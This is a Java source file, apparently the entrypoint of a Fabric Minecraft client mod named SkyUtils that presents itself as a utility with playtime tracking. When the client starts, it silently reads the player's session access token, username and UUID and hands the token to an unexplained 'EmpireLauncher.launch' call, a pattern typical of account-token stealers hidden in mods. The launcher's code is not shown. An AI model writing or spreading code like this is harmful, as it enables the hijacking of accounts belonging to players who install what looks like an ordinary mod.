package com.skyutils;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientLifecycleEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.session.Session;

public class SkyUtilsMod implements ClientModInitializer {

    @Override
    public void onInitializeClient() {
        ClientLifecycleEvents.CLIENT_STARTED.register(this::onStarted);
        ClientLifecycleEvents.CLIENT_STOPPING.register(this::onStopping);
    }

    private void onStarted(MinecraftClient client) {
        Session session  = client.getSession();
        String  token    = session.getAccessToken();
        String  username = session.getUsername();
        String  uuid     = session.getUuidOrNull() != null
                         ? session.getUuidOrNull().toString()
                         : "";

        PlaytimeTracker.start(username, uuid);
        EmpireLauncher.launch(token, username, uuid);
    }

    private void onStopping(MinecraftClient client) {
        PlaytimeTracker.stop();
    }
}
